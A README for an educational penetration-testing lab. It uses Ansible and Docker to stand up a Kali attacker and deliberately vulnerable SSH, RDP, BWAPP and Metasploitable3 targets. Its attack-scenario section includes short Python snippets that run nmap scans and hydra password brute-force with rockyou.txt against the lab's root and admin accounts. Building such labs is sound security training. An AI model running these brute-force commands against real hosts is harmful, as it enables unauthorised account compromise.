# BootCon Project Documentation

## 📌 Project Overview
Demonstrating automated penetration testing tools and vulnerable targets using containerized environments with Ansible automation.

## 🛠️ Core Technologies

### Ansible
- Infrastructure as Code (IaC) automation tool
- Uses YAML syntax for playbooks
- Agentless architecture (only needs SSH)
- Handles configuration management and deployment

### Python
- High-level programming language
- Used for automation scripts
- Extensive security testing libraries
- Cross-platform compatibility

### Docker & Colima
- Docker: Container platform for isolated environments
- Colima: macOS Docker runtime alternative
- Provides network isolation for security testing

## 🎯 Lab Components

### 1. Attack Platform
- Kali Linux container
- Pre-installed tools:
  - Hydra (Password cracking)
  - Nmap (Port scanning)
  - Metasploit Framework
  - Python3

### 2. Vulnerable Targets
- SSH Server (Ubuntu)
- RDP Server (Ubuntu + XRDP)
- Metasploitable3
- BWAPP (Vulnerable web application)

## 🔧 Setup Structure

````yaml
---
- name: Import Network Setup
  import_playbook: setup-network.yml

- name: Import Kali Attacker Setup
  import_playbook: setup-kali.yml

- name: Import SSH Target Setup
  import_playbook: setup-target.yml

- name: Import RDP Target Setup
  import_playbook: setup-rdp.yml

- name: Import BWAPP Target Setup
  import_playbook: setup-bwapp.yml

- name: Import Metasploit Target Setup
  import_playbook: setup-metasploit.yml
````

## 🚀 Quick Start

```bash
# Start Colima
colima start --memory 4 --arch x86_64 --network-address

# Set Docker host
export DOCKER_HOST=unix://$HOME/.colima/default/docker.sock

# Run lab setup
cd ssh-brute-lab/ansible/lab
ansible-playbook lab-setup.yml
```

## 🎯 Attack Scenarios

### 1. SSH Brute Force
```python
import os

def ssh_attack():
    target = "target_ssh"
    port = 2222
    os.system(f"nmap -p{port} -sV {target}")
    os.system(f"hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://{target}")
```

### 2. RDP Attack
```python
def rdp_attack():
    target = "rdp_target"
    port = 3389
    os.system(f"nmap -p{port} -sV {target}")
    os.system(f"hydra -l admin -P /usr/share/wordlists/rockyou.txt rdp://{target}")
```

## 🧪 Lab Network
- Network: pentest-net (172.18.0.0/16)
- Kali: 172.18.0.2
- Target SSH: 172.18.0.3
- Target RDP: 172.18.0.4
- BWAPP: 172.18.0.5
- Metasploit: 172.18.0.6

## 🔒 Security Notes
- Lab environment only
- Isolated network
- For educational purposes
- Never use in production

## 🧹 Cleanup

````yaml
---
- name: Clean up Lab Environment
  hosts: localhost
  connection: local
  vars:
    docker_socket: "unix://{{ lookup('env', 'HOME') }}/.colima/default/docker.sock"
  
  tasks:
    - name: Remove all lab containers
      community.docker.docker_container:
        name: "{{ item }}"
        state: absent
        force_kill: yes
        docker_host: "{{ docker_socket }}"
      loop:
        - kali_attacker
        - target_ssh
        - rdp_target
        - bwapp_target
        - metasploit_target
````

## 📊 Project Structure
```
bootcon-project/
├── ssh-brute-lab/
│   ├── ansible/
│   │   ├── lab/
│   │   │   ├── lab-setup.yml
│   │   │   ├── setup-network.yml
│   │   │   ├── setup-kali.yml
│   │   │   ├── setup-target.yml
│   │   │   ├── setup-rdp.yml
│   │   │   ├── setup-bwapp.yml
│   │   │   ├── setup-metasploit.yml
│   │   │   └── lab-cleanup.yml
│   │   └── inventory.yml
│   └── scripts/
│       ├── ssh_attack.py
│       ├── rdp_attack.py
│       └── verify_lab.py
└── README.md
```

## 🎓 Learning Outcomes
- Ansible automation
- Container security
- Network penetration testing
- Python scripting
- Infrastructure as Code